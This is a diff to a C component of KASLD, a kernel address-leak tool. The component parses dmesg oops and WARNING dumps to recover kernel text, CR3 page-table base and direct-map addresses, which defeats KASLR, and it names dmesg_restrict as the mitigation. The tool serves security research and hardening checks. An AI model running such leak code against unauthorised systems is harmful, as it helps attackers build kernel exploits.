@@ -1,29 +1,39 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
 //
-// Search kernel log for kernel oops messages and extract:
+// Search the kernel log for oops/WARNING dumps and extract kernel addresses.
 //
-// 1. Kernel text addresses from [<addr>] call trace tokens.
-// 2. Physical DRAM address from CR3 page table base register (x86).
-// 3. Directmap virtual addresses from register dump values that fall
-//    in the PAGE_OFFSET..KERNEL_VIRT_TEXT_MIN range.
+// The log is walked as an ordered stream of lines (one pass), so a register
+// dump can be associated with the process context of its own dump. Three kinds
+// of value are recovered:
 //
-// Oops messages contain structured register dumps whose format varies
-// by architecture:
-//
-//   x86_64:  RAX/RBX/..., CR3 (physical page table base)
-//   x86_32:  eax/ebx/..., CR3
-//   arm64:   x0..x29
-//   riscv64: gp/tp/t0..a7/s0..s11
-//
-// Individual register values are unpredictable across different oopses,
-// but any value landing in a known kernel address range is useful.
+// 1. Kernel text addresses from [<addr>] call-trace tokens (pre-symbolised,
+//    i.e. older, kernels; modern call traces print "func+off/size" with no raw
+//    address). On LoongArch the register dump additionally prints the raw pc/ra
+//    kernel-text registers — other arches symbolise PC/LR with %pS — so they
+//    are read directly there.
+// 2. The physical page-table base from the x86 CR3 register. CR3 is the only
+//    page-table base any architecture prints in a register dump (arm64/riscv
+//    dump PC/LR/SP + GPRs but no TTBR/SATP), so this is x86-only. Its meaning
+//    depends on the faulting task:
+//      - idle task (PID 0 / comm "swapper"): CR3 == swapper_pg_dir, which lives
+//        in the kernel .bss section -> a kernel-image landmark
+//        (REGION_KERNEL_BSS) that pins the physical image base.
+//      - any other task: CR3 is that process's PGD, allocated anywhere in DRAM
+//        by the buddy allocator -> generic RAM (REGION_RAM), carrying no
+//        image-base information.
+//    The dump header (CPU/PID/Comm) provides the discriminator; the register
+//    value itself cannot, as the kernel image base is not yet known.
+// 3. Direct-map virtual addresses: register values that fall in the
+//    PAGE_OFFSET..KERNEL_VIRT_TEXT_MIN range. This generalises across
+//    architectures (x86 GPRs, arm64 x0-x30, riscv a*/s*/t*).
 //
 // Leak primitive:
-//   Data leaked:      kernel text addresses, physical page table base (CR3),
+//   Data leaked:      kernel text addresses, physical page-table base (CR3),
 //                     directmap virtual addresses from register dumps
-//   Kernel subsystem: arch/*/kernel — kernel oops handler (show_regs)
+//   Kernel subsystem: arch/*/kernel — kernel oops handler (show_regs) +
+//                     lib/dump_stack.c (the CPU/PID/Comm header)
 //   Data structure:   struct pt_regs (register dump), call trace addresses
-//   Address type:     virtual (kernel text) + physical (CR3 on x86)
+//   Address type:     virtual (kernel text / directmap) + physical (CR3 on x86)
 //   Method:           parsed (dmesg oops output)
 //   Status:           unfixed (oops output is essential for debugging)
 //   Access check:     do_syslog() → check_syslog_permissions(); gated by
@@ -32,8 +42,8 @@
 //   https://elixir.bootlin.com/linux/v6.12/source/arch/x86/kernel/dumpstack.c
 //
 // Mitigations:
-//   Access gated by dmesg_restrict (see dmesg.h for shared access gate
-//   details). Oops output cannot be suppressed without CONFIG_PANIC_ON_OOPS.
+//   Access gated by dmesg_restrict (see syslog.h for the shared access gate).
+//   Oops output cannot be suppressed without CONFIG_PANIC_ON_OOPS.
 //   %pK/%pS sanitization does not apply to oops register dumps.
 //
 // Requires:
@@ -44,9 +54,9 @@
 // <bcoles@gmail.com>
 
 #define _GNU_SOURCE
-#include "include/dmesg.h"
 #include "include/kasld/api.h"
 #include "include/kasld/cli.h"
+#include "include/syslog.h"
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -54,12 +64,13 @@
 #include <unistd.h>
 
 KASLD_EXPLAIN(
-    "Extracts kernel addresses from oops/panic call traces in dmesg. "
-    "Bracketed addresses [<ffffffff...>] are kernel text pointers; "
-    "x86 CR3 values reveal the physical page table base; register "
-    "dumps may contain direct-map virtual addresses. Any kernel crash "
-    "or warning logged to dmesg can expose multiple address types. "
-    "Access is gated by dmesg_restrict.");
+    "Extracts kernel addresses from oops/WARNING register dumps in dmesg. "
+    "Bracketed [<ffffffff...>] tokens are kernel text pointers; register "
+    "values in the direct-map range bound the direct-map base; the x86 CR3 "
+    "register exposes the physical page-table base. CR3 is classified by the "
+    "dump's process context — the idle task's CR3 is swapper_pg_dir (kernel "
+    ".bss), any other task's is a process page table in generic DRAM. Access "
+    "is gated by dmesg_restrict.");
 
 KASLD_META("method:parsed\n"
            "phase:inference\n"
@@ -68,17 +79,24 @@ KASLD_META("method:parsed\n"
            "bypass:CAP_SYSLOG\n"
            "fallback:/var/log/dmesg\n");
 
-struct oops_ctx {
-  unsigned long text;
-  unsigned long directmap;
-  unsigned long phys;
+/* Extraction state, accumulated across the whole log in one ordered pass. */
+struct btctx {
+  unsigned long text;      /* lowest kernel-text address seen (0 = none)      */
+  unsigned long directmap; /* lowest directmap-range register value (0 = none)*/
+  unsigned long cr3; /* lowest CR3 page-table base, phys (0 = none)      */
+  int cr3_swapper;   /* chosen CR3's dump was idle-task (swapper) context*/
+  /* Current dump's context, set by a header line and consumed by the next CR3
+   * line, then reset — so each CR3 is attributed to its own dump, and an
+   * evicted header degrades to the conservative non-swapper tag. */
+  int ctx_known;
+  int ctx_swapper;
 };
 
-/* Check if an address falls in the directmap region:
- * above PAGE_OFFSET but below both text and module regions.
- *
- * On arches where directmap overlaps text (arm32, x86_32), this
- * returns 0 for all values because PAGE_OFFSET >= KERNEL_VIRT_TEXT_MIN. */
+/* True if an address is in the direct-map region: at/above PAGE_OFFSET but
+ * below the text and module regions. On arches where the direct map overlaps
+ * text (arm32, x86_32) PAGE_OFFSET >= KERNEL_VIRT_TEXT_MIN, so this is always
+ * false — correctly, those arches expose no separable direct-map window here.
+ */
 static int in_directmap_range(unsigned long val) {
   if (val < PAGE_OFFSET)
     return 0;
@@ -91,87 +109,79 @@ static int in_directmap_range(unsigned long val) {
   return 1;
 }
 
-/* Scan [<addr>] tokens in call trace lines for kernel text addresses. */
-static int on_calltrace(const char *line, void *ctx) {
-  struct oops_ctx *c = ctx;
-  const char *ptr = line;
-  char *endptr;
-
-  while ((ptr = strstr(ptr, "[<")) != NULL) {
-    ptr += 2;
-    unsigned long addr = strtoul(ptr, &endptr, 16);
-
-    if (!addr)
-      continue;
-
-    if (kasld_addr_is_kernel_text(addr)) {
-      if (!c->text || addr < c->text)
-        c->text = addr;
+/* Case-insensitive substring search; `needle` must be lower-case. Used instead
+ * of strcasestr(), which is not portable across the cross toolchains. */
+static const char *ci_find(const char *hay, const char *needle) {
+  for (; *hay; hay++) {
+    const char *h = hay, *n = needle;
+    while (*n) {
+      int hc = (unsigned char)*h;
+      if (hc >= 'A' && hc <= 'Z')
+        hc = hc - 'A' + 'a';
+      if (hc != (unsigned char)*n)
+        break;
+      h++;
+      n++;
     }
+    if (!*n)
+      return hay;
   }
-
-  return 1;
+  return NULL;
 }
 
-/* Scan CR3 line for physical page table base address (x86).
- * Format: "CR2: %016lx CR3: %016lx CR4: %016lx" */
-static int on_cr3(const char *line, void *ctx) {
-  struct oops_ctx *c = ctx;
-  const char *p = strstr(line, "CR3:");
-  if (!p)
-    return 1;
+/* A dump header line carries both a pid and a comm token. The idle task — whose
+ * CR3 is swapper_pg_dir (in .bss) — is PID 0 / comm "swapper". Matched
+ * case-insensitively to cover every format dump_stack_print_info has printed:
+ *   "CPU: 3 PID: 633 Comm: foo ..."           (current)
+ *   "CPU: 3 UID: 0 PID: 633 Comm: foo ..."    (UID field added in v6.11)
+ *   "Pid: 633, comm: foo ..."                 (pre-~v3.9: lower-case, comma)
+ * Returns 1 and sets *swapper when the line is a header; 0 otherwise. */
+static int parse_header(const char *line, int *swapper) {
+  const char *pid = ci_find(line, "pid:");
+  const char *comm = ci_find(line, "comm:");
+  if (!pid || !comm)
+    return 0;
 
-  p += 4;
-  while (*p == ' ')
+  int sw = 0;
+
+  const char *p = pid + 4; /* past "pid:" */
+  while (*p == ' ' || *p == '\t')
     p++;
+  char *endp;
+  unsigned long pidv = strtoul(p, &endp, 10);
+  if (endp != p && pidv == 0)
+    sw = 1;
 
-  char *endptr;
-  unsigned long addr = strtoul(p, &endptr, 16);
-  if (endptr == p || !addr)
-    return 1;
+  const char *c = comm + 5; /* past "comm:" */
+  while (*c == ' ' || *c == '\t')
+    c++;
+  if (ci_find(c, "swapper") == c) /* comm begins with "swapper" */
+    sw = 1;
 
-  /* CR3 may include PCID/ASID bits in the low 12 bits; mask to page */
-  addr &= ~(PAGE_SIZE - 1);
-
-  if (!c->phys || addr < c->phys)
-    c->phys = addr;
-
+  *swapper = sw;
   return 1;
 }
 
-/* Scan register dump lines for hex values in the directmap range.
- * Handles all architectures: extracts values after ": " delimiters. */
-static int on_regdump(const char *line, void *ctx) {
-  struct oops_ctx *c = ctx;
-  const char *p = line;
-
-  while ((p = strstr(p, ": ")) != NULL) {
-    p += 2;
-
-    char *endptr;
-    unsigned long val = strtoul(p, &endptr, 16);
-    if (endptr == p)
-      continue;
-
-    p = endptr;
-
-    if (val && in_directmap_range(val)) {
-      if (!c->directmap || val < c->directmap)
-        c->directmap = val;
-    }
-  }
-
-  return 1;
-}
-
-/* Architecture-specific needles for register dump lines.
- * Each matches the first register name on a dump line so
- * the callback can extract all values from that line. */
+/* Architecture register-dump line markers. Each entry matches the start of a
+ * register line in that architecture's show_regs() output; a matched line is
+ * then scanned for all its hex values (the direct-map range check discards the
+ * rest). Only architectures with a *separable* direct-map window are listed —
+ * i.e. PAGE_OFFSET < KERNEL_VIRT_TEXT_MIN (equivalently
+ * !TEXT_TRACKS_DIRECTMAP):
+ *
+ *   x86_64   RAX/RBX/RCX, RDX/RSI/RDI, RBP/R8/R9, R10..R15  (+ CR3)
+ *   arm64    x0..x30   (three per line: "x0 :", "x4 :", ...)
+ *   riscv64  gp/tp, t0..t6, s0..s11, a0..a7 (" gp :", " s1 :", ...)
+ *
+ * On coupled arches (x86_32, mips, loongarch, arm32, ppc) the kernel image
+ * lives inside the direct-map region, so in_directmap_range() is always false
+ * and register scanning would yield nothing; they fall through to the empty
+ * list and rely on the call-trace path (and, on x86, the separate CR3 path).
+ * The CR3 page-table base is x86-only — no other architecture prints a
+ * page-table base register (TTBR/SATP) in its dump. */
 #if defined(__x86_64__)
 static const char *reg_needles[] = {
     "RAX:", "RDX:", "RBP:", "R10:", "R13:", NULL};
-#elif defined(__i386__)
-static const char *reg_needles[] = {"eax:", "esi:", NULL};
 #elif defined(__aarch64__)
 static const char *reg_needles[] = {
     "x0 :", "x4 :", "x8 :", "x12:", "x16:", "x20:", "x24:", "x28:", NULL};
@@ -182,21 +192,197 @@ static const char *reg_needles[] = {
 static const char *reg_needles[] = {NULL};
 #endif
 
+static int is_regdump_line(const char *line) {
+  for (int i = 0; reg_needles[i]; i++)
+    if (strstr(line, reg_needles[i]))
+      return 1;
+  return 0;
+}
+
+/* Hex-digit test (locale-independent; avoids <ctype.h>). */
+static int is_hex_digit(int c) {
+  return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
+         (c >= 'A' && c <= 'F');
+}
+
+/* Parse the next run of hex digits at or after *pp as a base-16 value (a "0x"
+ * prefix is accepted). Leading non-hex characters are skipped. On success sets
+ * *out, advances *pp past the run, and returns 1; returns 0 when the line is
+ * exhausted. Bounds-safe: never reads past the terminating NUL, and always
+ * advances, so callers cannot loop forever. The single hex extractor shared by
+ * the text, direct-map, and CR3 scanners; incidental short runs (register-name
+ * letters, symbol offsets) are filtered by each caller's range predicate. */
+static int next_addr_token(const char **pp, unsigned long *out) {
+  const char *p = *pp;
+  while (*p && !is_hex_digit((unsigned char)*p))
+    p++;
+  if (!*p) {
+    *pp = p;
+    return 0;
+  }
+  char *end;
+  *out = strtoul(p, &end, 16);
+  *pp = (end > p) ? end : p + 1;
+  return 1;
+}
+
+/* Scan a call-trace line for kernel-text addresses, keeping the lowest. */
+static void scan_text(const char *line, struct btctx *c) {
+  const char *p = line;
+  unsigned long a;
+  while (next_addr_token(&p, &a))
+    if (a && kasld_addr_is_kernel_text(a) && (!c->text || a < c->text))
+      c->text = a;
+}
+
+/* Scan a register-dump line for direct-map-range values, keep the lowest.
+ *
+ * Every "0x..." register value at/above PAGE_OFFSET is a sound upper bound on
+ * the direct-map base (the lowest such value is the tightest), which is why the
+ * minimum is what matters. The stack pointer under CONFIG_VMAP_STACK is also a
+ * vmalloc_base witness, but a register value cannot be classified as vmalloc
+ * vs direct map before the randomized region bases are resolved (the regions
+ * are ordered direct map < vmalloc < vmemmap, but their boundaries are exactly
+ * the unknowns). A vmalloc-specific bound therefore belongs to the inference
+ * layer, not here, and is not emitted. */
+static void scan_directmap(const char *line, struct btctx *c) {
+  const char *p = line;
+  unsigned long v;
+  while (next_addr_token(&p, &v))
+    if (v && in_directmap_range(v) && (!c->directmap || v < c->directmap))
+      c->directmap = v;
+}
+
+/* Parse the LoongArch first GPR line, "pc <hex> ra <hex> tp <hex> sp <hex>",
+ * setting *pc and *ra to the raw kernel-text registers (0 when not found). pc
+ * (= CSR.ERA, the faulting instruction) and ra (return address) are in kernel
+ * text; tp/sp are not, but LoongArch is coupled (text and data share the
+ * 0x9000... window) so they cannot be excluded by address range — hence the two
+ * registers are read positionally by field name rather than range-scanned.
+ * Always compiled (so it is unit-testable); only invoked on LoongArch, where
+ * the marked-unused attribute is moot. */
+__attribute__((unused)) static void
+parse_loongarch_pc_ra(const char *line, unsigned long *pc, unsigned long *ra) {
+  *pc = 0;
+  *ra = 0;
+  const char *p = strstr(line, "pc ");
+  if (!p)
+    return;
+  p += 3;
+  next_addr_token(&p, pc);
+  const char *r = strstr(p, "ra ");
+  if (r) {
+    r += 3;
+    next_addr_token(&r, ra);
+  }
+}
+
+/* Per-line state machine for the single ordered pass. */
+static void on_line(char *line, void *vctx) {
+  struct btctx *c = vctx;
+
+  /* Header line → (re)set the current dump context. */
+  int sw;
+  if (parse_header(line, &sw)) {
+    c->ctx_known = 1;
+    c->ctx_swapper = sw;
+    return;
+  }
+
+  /* CR3 line (x86): "CR2: %lx CR3: %lx CR4: %lx". Attribute the value to the
+   * current dump's context, then reset the context so the next CR3 must see its
+   * own header (correct across multiple dumps; an evicted header → non-swapper,
+   * i.e. the conservative REGION_RAM tag). */
+  const char *cr3 = strstr(line, "CR3:");
+  if (cr3) {
+    const char *p = cr3 + 4;
+    unsigned long v;
+    if (next_addr_token(&p, &v) && v) {
+      v &= ~(unsigned long)(PAGE_SIZE - 1); /* strip PCID/ASID low bits */
+      if (!c->cr3 || v < c->cr3) {
+        c->cr3 = v;
+        c->cr3_swapper = c->ctx_known ? c->ctx_swapper : 0;
+      }
+    }
+    c->ctx_known = 0;
+    return;
+  }
+
+  /* Legacy bracketed call-trace text tokens (pre-symbolised kernels). */
+  if (strstr(line, "[<")) {
+    scan_text(line, c);
+    return;
+  }
+
+  /* Register-dump line → direct-map-range values. */
+  if (is_regdump_line(line)) {
+    scan_directmap(line, c);
+    return;
+  }
+
+#if defined(__loongarch__) && __loongarch_grlen == 64
+  /* LoongArch prints raw kernel-text registers (pc/ra) instead of the
+   * %pS-symbolised PC/LR of other arches. Read them positionally and keep the
+   * lowest that is genuinely vmlinux text (a module ra in the 0xffff... region
+   * is filtered out by the text-range check). */
+  {
+    unsigned long pc, ra;
+    parse_loongarch_pc_ra(line, &pc, &ra);
+    if (pc && kasld_addr_is_kernel_text(pc) && (!c->text || pc < c->text))
+      c->text = pc;
+    if (ra && kasld_addr_is_kernel_text(ra) && (!c->text || ra < c->text))
+      c->text = ra;
+  }
+#endif
+}
+
+/* Walk every line of the kernel log in order, calling fn(line, ctx) per line.
+ *
+ * A single source is used so line order — hence dump-block structure — is
+ * preserved: under KASLD_SYSROOT the captured /var/log/dmesg (klogctl would
+ * read the live host, not the analysed tree); otherwise klogctl, with the file
+ * as fallback. The mapping is left to be reclaimed at process exit — these
+ * components are one-shot (the same convention as the shared dmesg helper).
+ * Returns 0 on success, -1 if no source is accessible. */
+typedef void (*line_fn)(char *line, void *ctx);
+static int foreach_dmesg_line(line_fn fn, void *ctx) {
+  char *buf;
+  int size;
+
+  int rc = kasld_sysroot() ? read_dmesg_log_file(&buf, &size)
+                           : mmap_syslog(&buf, &size);
+  if (rc != 0 || size <= 0)
+    return -1;
+
+  /* The mmap allocation is page-rounded strictly above `size`, so buf[size] is
+   * a valid, writable byte — the buffer is safe to treat as line-terminable. */
+  char *end = buf + size;
+  char *p = buf;
+  while (p < end) {
+    char *nl = memchr(p, '\n', (size_t)(end - p));
+    size_t len = nl ? (size_t)(nl - p) : (size_t)(end - p);
+    p[len] = '\0';
+    fn(p, ctx);
+    if (!nl)
+      break;
+    p += len + 1;
+  }
+  return 0;
+}
+
 int main(void) {
-  struct oops_ctx ctx = {0, 0, 0};
+  struct btctx ctx;
+  memset(&ctx, 0, sizeof(ctx));
 
   kasld_info("searching dmesg for kernel oops information ...");
 
-  int ds = dmesg_search("[<", on_calltrace, &ctx);
-  if (ds < 0)
+  if (foreach_dmesg_line(on_line, &ctx) < 0) {
+    kasld_err("dmesg unavailable (klogctl denied and /var/log/dmesg "
+              "unreadable)");
     return KASLD_EXIT_NOPERM;
+  }
 
-  dmesg_search("CR3:", on_cr3, &ctx);
-
-  for (int i = 0; reg_needles[i]; i++)
-    dmesg_search(reg_needles[i], on_regdump, &ctx);
-
-  if (!ctx.text && !ctx.directmap && !ctx.phys) {
+  if (!ctx.text && !ctx.directmap && !ctx.cr3) {
     kasld_err("no kernel oops information found in dmesg");
     return 0;
   }
@@ -204,54 +390,48 @@ int main(void) {
   if (ctx.text) {
     kasld_info("lowest leaked text address: %lx", ctx.text);
     kasld_info("possible kernel base: %lx", kasld_floor_text_base(ctx.text));
-    /* Call-trace addresses point at specific kernel text symbols
-     * (function bodies, exception handlers). The component doesn't
-     * resolve the symbol name, so name is left empty. */
+    /* Call-trace addresses point at specific kernel text symbols; the symbol
+     * name is not resolved, so the result is unnamed. */
     kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, ctx.text, NULL,
                         CONF_PARSED);
   }
 
-  if (ctx.phys) {
-    kasld_found("leaked physical address (CR3): %lx", ctx.phys);
-    /* CR3 is the active PGD's physical address at the point of the oops.
-     * Tagging trade-off (intentional KERNEL_BSS choice):
-     *
-     *   Kernel-thread context — CR3 = swapper_pg_dir, which lives in the
-     *   kernel .bss section. kernel_image_phys_bound's BSS-gap refinement
-     *   then yields a TIGHT upper bound on phys_image_base (offset of
-     *   swapper from _stext is small — ~38 MiB on stock x86_64).
-     *
-     *   User-process context — CR3 = task's PGD, allocated by the buddy
-     *   allocator anywhere in DRAM. kernel_image_phys_bound emits an
-     *   upper bound (vacuous: well above the true text base, harmlessly
-     *   subsumed) and a lower bound (contradicts the resolved upper
-     *   bound from text-pin / coupling synth, cleanly rejected at the
-     *   resolver with one log line under -v).
-     *
-     * The user-context case produces no functional impact — both
-     * emitted constraints are either subsumed or rejected. The
-     * kernel-thread case produces real tightening. Keeping the
-     * KERNEL_BSS tag preserves the rare-but-useful capability at the
-     * cost of one rejection log line in the common case. */
-    kasld_result_sample(KASLD_TYPE_PHYS, REGION_KERNEL_BSS, ctx.phys, "cr3",
-                        CONF_PARSED);
+  if (ctx.cr3) {
+    kasld_found("leaked physical page-table base (CR3): %lx", ctx.cr3);
+    if (ctx.cr3_swapper) {
+      /* Idle-task context: CR3 == swapper_pg_dir, in kernel .bss. A genuine
+       * image landmark — kernel_image_phys_bound pins the physical image base
+       * from it (swapper sits a small fixed offset above _stext). */
+      kasld_result_sample(KASLD_TYPE_PHYS, REGION_KERNEL_BSS, ctx.cr3, "cr3",
+                          CONF_PARSED);
+    } else {
+      /* Task or unknown context: CR3 is a process PGD, allocated anywhere in
+       * DRAM by the buddy allocator — not a kernel-image landmark. Tagged as
+       * generic RAM: honest provenance, and it carries no image-base
+       * information (the engine has no constraint to derive from it). */
+      kasld_result_sample(KASLD_TYPE_PHYS, REGION_RAM, ctx.cr3, "cr3",
+                          CONF_PARSED);
+    }
 #if defined(phys_to_directmap_virt) && TEXT_TRACKS_DIRECTMAP
-    /* On coupled arches the directmap virt of the CR3 phys is computable
-     * via the static linear map. In the kernel-thread case this IS the
-     * BSS virtual address; in the user case it's just a generic directmap
-     * landmark. Tag KERNEL_BSS for symmetry with the phys side. */
-    unsigned long virt = phys_to_directmap_virt(ctx.phys);
-    kasld_info("possible direct-map virtual address: %lx", virt);
-    kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_BSS, virt, "cr3",
-                        CONF_PARSED);
+    /* Coupled arches: project the CR3 phys to its direct-map virtual address.
+     * Defensive — CR3 is x86-only and x86 is decoupled, so this is unreached in
+     * practice — but kept correct: swapper → .bss virt, otherwise a generic
+     * direct-map landmark. */
+    {
+      unsigned long virt = phys_to_directmap_virt(ctx.cr3);
+      enum kasld_region r =
+          ctx.cr3_swapper ? REGION_KERNEL_BSS : REGION_DIRECTMAP;
+      kasld_info("possible direct-map virtual address: %lx", virt);
+      kasld_result_sample(KASLD_TYPE_VIRT, r, virt, "cr3", CONF_PARSED);
+    }
 #endif
   }
 
   if (ctx.directmap) {
     kasld_found("leaked directmap virtual address: %lx", ctx.directmap);
-    /* Generic directmap point recovered from a register dump — we know
-     * it's *somewhere* in directmap but not what kernel object it points
-     * to. Fall back to the address-space landmark. */
+    /* A register value known only to be somewhere in the direct map — an
+     * address-space landmark bounding the direct-map base, not a specific
+     * object. */
     kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, ctx.directmap, NULL,
                         CONF_PARSED);
   }
